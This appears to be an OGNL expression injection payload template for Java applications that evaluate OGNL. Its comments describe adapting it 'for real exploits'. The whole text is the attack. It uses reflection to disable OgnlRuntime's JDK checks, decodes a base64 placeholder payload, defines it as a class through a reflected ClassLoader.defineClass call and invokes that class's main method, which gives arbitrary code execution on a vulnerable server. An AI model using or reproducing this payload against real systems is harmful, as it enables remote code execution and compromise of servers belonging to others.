// intended to be passed to Ognl.getValue with any root object. For real exploits
// some preprocessing of the result might be needed, e. g. comments may have to be
// stripped and lines may have to be joined depending on the context. 

// note that you may have to disable _jdk15 features as some older (vulnerable)
// OGNL versions fail at calling varargs methods where the varargs array is not an
// Object[]. In case your JDK is not JDK15 or the OGNL is even older, just remove
// the following part:

#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),
#q.setAccessible(true),
#q.set(null,true),
#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),
#q.setAccessible(true),
#q.set(null,false),

// decode the payload

#DATA=new sun.misc.BASE64Decoder().decodeBuffer('${[BASE64PAYLOAD]}'),
#ldr=new java.net.URLClassLoader(new java.net.URL[0]),

// get a class loader and load our payload

#clc=@java.lang.Class@forName('java.lang.ClassLoader'),
#m=#clc.getDeclaredMethod('defineClass',new java.lang.Class[]{@java.lang.Class@forName('[B'),@java.lang.Integer@TYPE,@java.lang.Integer@TYPE}),
#m.setAccessible(true),
#c=#m.invoke(#ldr,new java.lang.Object[]{#DATA,0,#DATA.length}),
#m=#clc.getDeclaredMethod('resolveClass',new java.lang.Class[]{@java.lang.Class@forName('java.lang.Class')}),
#m.setAccessible(true),
#m.invoke(#ldr,new java.lang.Object[]{#c}),

// execute our payload

#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(null,new java.lang.Object[]{new java.lang.String[0]})